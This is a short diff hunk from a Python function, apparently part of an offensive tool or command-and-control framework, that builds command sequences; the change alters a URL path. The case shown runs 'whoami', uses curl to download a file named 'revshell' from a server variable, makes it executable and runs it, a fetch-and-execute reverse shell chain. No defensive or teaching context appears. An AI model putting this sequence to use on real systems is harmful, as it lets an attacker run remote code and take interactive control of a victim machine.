@@ -64,7 +64,7 @@ def getsequence(id=0, srv=""):
         case 7:
             SEQUENCE = [
                 "whoami",
-                "curl -s " + srv + "/post/revshell -o revshell > /dev/null",
+                "curl -s " + srv + "/post/vir/revshell -o revshell > /dev/null",
                 "chmod +x revshell",
                 "./revshell",
             ]
